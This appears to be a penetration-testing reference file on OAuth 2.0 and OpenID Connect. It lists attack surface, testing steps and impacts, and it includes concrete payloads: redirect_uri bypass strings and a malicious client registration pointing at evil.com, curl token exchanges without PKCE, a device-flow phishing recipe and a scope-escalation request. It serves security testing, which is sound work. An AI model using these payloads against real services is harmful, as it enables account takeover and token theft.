---
name: oauth
description: OAuth 2.0 security testing covering authorization code interception, redirect URI manipulation, and PKCE bypass
---

# OAuth 2.0

Security testing for OAuth 2.0 and OpenID Connect implementations. Focus on authorization code interception, redirect URI manipulation, PKCE bypass, token theft via Referer leakage, state/nonce CSRF, client secret leakage in SPAs, and device flow abuse.

## Attack Surface

**Grant Types**
- Authorization Code (with and without PKCE)
- Implicit (deprecated but still deployed)
- Client Credentials, ROPC, Device Authorization (RFC 8628), Refresh Token

**Endpoints**
- Authorization (`/authorize`), Token (`/token`), Revocation (`/revoke`)
- Introspection (`/introspect`), UserInfo (`/userinfo`)
- JWKS (`/.well-known/jwks.json`), Discovery (`/.well-known/openid-configuration`)

**Token Types**
- Access tokens (opaque, JWT), refresh tokens, ID tokens (OIDC), authorization codes

**Client Types**
- Confidential clients (server-side, with client_secret)
- Public clients (SPAs, mobile apps, CLIs)

## Reconnaissance

**Discovery Document**
```
GET /.well-known/openid-configuration
GET /.well-known/oauth-authorization-server
```
Extract: `authorization_endpoint`, `token_endpoint`, `grant_types_supported`, `response_types_supported`, `code_challenge_methods_supported`, `scopes_supported`.

**Client Enumeration**
- Extract `client_id` and `redirect_uri` from page source, JS bundles, mobile app decompilation
- Look for `client_secret` in SPAs, mobile apps, public repositories, `.env` files

**Token Analysis**
```bash
# Decode JWT access/ID tokens
echo 'eyJhbGciOi...' | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# Check: iss, aud, exp, nbf, scope/scp, sub, azp, nonce, algorithm (none, alg confusion)
```

**Scope Discovery**
Probe for undocumented scopes: `admin`, `admin:*`, `org:admin`, `user:write`, `delete`. Authorization servers may silently ignore unknown scopes or return them granted.

## Key Vulnerabilities

### Authorization Code Interception

**Open Redirect via redirect_uri**
If the authorization server does not perform exact-match validation on `redirect_uri`, the code is delivered to the attacker:
```
redirect_uri=https://evil.com/callback
redirect_uri=https://legit.com/callback/../../../evil.com
redirect_uri=https://legit.com/callback%23@evil.com
redirect_uri=https://legit.com/callback?next=https://evil.com
redirect_uri=https://legit.com@evil.com
redirect_uri=https://legit.com%40evil.com/callback
```

**Subdomain Matching Bypass**
If the server allows any subdomain of the registered domain:
```
redirect_uri=https://attacker-controlled.legit.com/callback
redirect_uri=https://xss-vulnerable-page.legit.com/callback
```
Chain with XSS on any subdomain to exfiltrate the authorization code.

### Redirect URI Manipulation

**Path Traversal**
```
redirect_uri=https://legit.com/callback/../../admin/page-with-external-resources
```
If the redirect lands on a page loading external resources, the authorization code leaks via the Referer header.

**Fragment vs Query Confusion**
In implicit flow, tokens are in the URL fragment. If the redirect target has JavaScript reading `location.hash` and sending it externally, the token is stolen.

**Dynamic Client Registration**
Some providers allow `/register`. Register a malicious client with attacker-controlled redirect_uri:
```bash
curl -X POST https://auth.target.com/register \
  -H 'Content-Type: application/json' \
  -d '{"redirect_uris":["https://evil.com/callback"],"client_name":"Legit App"}'
```

### PKCE Bypass

**S256 to Plain Downgrade**
```
# Legitimate: code_challenge_method=S256&code_challenge=<SHA256(verifier)>
# Attack:     code_challenge_method=plain&code_challenge=<known_value>
```
If the server accepts `plain` when the client registered for `S256`, the attacker exchanges the intercepted code with a known `code_verifier`.

**Missing PKCE Enforcement**
```bash
# Omit code_challenge entirely, exchange code without code_verifier
curl -X POST https://auth.target.com/token \
  -d 'grant_type=authorization_code&code=AUTH_CODE&redirect_uri=REDIRECT&client_id=CLIENT'
```
If the server does not require PKCE for public clients, intercepted codes are directly exchangeable.

### Token Theft via Referer Leakage

When the authorization code appears in the URL, external resources on the redirect page leak it:
```
# Redirect to: https://legit.com/callback?code=SECRET_CODE
# Page loads: <img src="https://analytics.evil.com/pixel.gif">
# Referer header to evil.com contains the full URL with code
```
Even with `Referrer-Policy: no-referrer`, check for leaks via `window.opener`, `postMessage`, or JavaScript-initiated navigations.

### State/Nonce CSRF

**Missing State Parameter**
An attacker initiates an OAuth flow with their own account and forces the victim to complete it, linking the attacker's external identity to the victim's local account (login CSRF).

**Predictable State**
```
state=1    state=timestamp    state=md5(client_id)    state=base64(counter)
```

**Nonce Replay (OIDC)**
If the `nonce` claim in the ID token is not validated or is reusable, stolen ID tokens can be replayed across sessions.

### Client Secret Leakage

```javascript
// Client secret exposed in JavaScript bundle
const config = {
  client_id: "app_123",
  client_secret: "sk_live_abc123",  // Leaked!
};
```

Search: JS source maps, mobile app decompiled code, public GitHub repos, browser storage, network traffic. With a leaked secret, an attacker can exchange intercepted codes, request client_credentials tokens, and impersonate the application.

### Device Flow Abuse (RFC 8628)

```bash
# Initiate device authorization
curl -X POST https://auth.target.com/device/code \
  -d 'client_id=CLIENT_ID&scope=openid profile'
# Response: device_code, user_code, verification_uri
# Social engineer victim into entering attacker's user_code, then poll:
curl -X POST https://auth.target.com/token \
  -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=DEVICE_CODE&client_id=CLIENT_ID'
```

The spec requires `slow_down` error handling, but implementations may not enforce polling interval limits.

## Bypass Techniques

**Response Type Confusion**
```
response_type=code          # Authorization code
response_type=token         # Implicit (may bypass PKCE)
response_type=code token    # Hybrid flow
response_type=id_token      # OIDC implicit
```
Switch response types to find flows with weaker security controls.

**Scope Escalation**
```bash
curl -X POST https://auth.target.com/token \
  -d 'grant_type=refresh_token&refresh_token=RT&scope=admin:write'
```
Some implementations do not validate that refresh scopes are a subset of the original grant.

**Token Substitution**
Use an access token from one client against another client's API. If the resource server validates only signature and not `aud`, cross-client access is possible.

**IDP Confusion (OIDC)**
In multi-provider setups, swap the `iss` claim between providers to authenticate as a different user if the relying party does not validate issuer strictly.

## Testing Methodology

1. **Discovery** - Fetch OIDC discovery document, enumerate endpoints, grant types, supported scopes
2. **Client analysis** - Extract client_id, client_secret, redirect_uris from client applications
3. **Redirect URI fuzzing** - Test exact match, subdomain wildcards, path traversal, encoding bypasses
4. **PKCE validation** - Attempt plain downgrade, omit code_challenge, test enforcement per client type
5. **State/nonce audit** - Verify state parameter presence, entropy, single-use enforcement
6. **Token analysis** - Decode JWTs, check algorithm, audience, expiry, scope claims
7. **Cross-flow testing** - Switch response_type, test implicit when code+PKCE is expected
8. **Refresh token abuse** - Test scope escalation, token reuse after revocation, cross-client usage
9. **Device flow** - Test polling rate limits, user_code entropy, social engineering viability

## Validation Requirements

- Redirect URI bypass: authorization code delivered to attacker-controlled URI with server response proof
- PKCE bypass: successful token exchange without valid code_verifier or with downgraded method
- CSRF via missing state: victim account linked to attacker's external identity with session evidence
- Token leakage: authorization code or token captured via Referer header from redirect target
- Scope escalation: refresh token grant returning elevated scope not in original authorization
- Client secret exposure: extracted secret with proof of token exchange using it

## False Positives

- Redirect URIs that appear open but are validated server-side after initial redirect
- State parameters that appear weak but are validated against a server-side session store
- Implicit flow support intentionally enabled for specific legacy client configurations

## Impact

- **Code interception + redirect URI bypass**: Full account takeover via stolen authorization code
- **PKCE bypass**: Nullifies the primary defense for public clients, enabling code interception attacks
- **State CSRF**: Account linking attacks, login CSRF, persistent unauthorized access
- **Client secret leakage**: Application impersonation, unauthorized token generation
- **Device flow abuse**: Phishing-based account compromise without credential theft

## Pro Tips

- Always check `/.well-known/openid-configuration` first; it reveals the entire attack surface in one request
- Use Burp Suite's OAuth/OIDC extension for automated flow interception and manipulation
- Test token revocation: revoke a refresh token and verify all derived access tokens are also invalidated
- Check if the authorization server supports `prompt=none` for silent re-authentication (useful for token theft chains)
- Look for `registration_endpoint` in discovery; dynamic client registration often has minimal validation
- Test `acr_values` and `amr` claims to downgrade authentication strength; mobile custom URI schemes are vulnerable to scheme hijacking

## Summary

OAuth 2.0 security testing requires systematic examination of each flow component: redirect URI validation strictness, PKCE enforcement for public clients, state parameter entropy and binding, token audience validation, and scope management across grant types. The highest-impact vulnerabilities are redirect URI manipulation combined with authorization code interception, which provides full account takeover. PKCE bypass and state CSRF represent fundamental protocol-level failures. Always test the interaction between multiple OAuth components, as individual protections can be undermined when combined flows are not validated holistically.
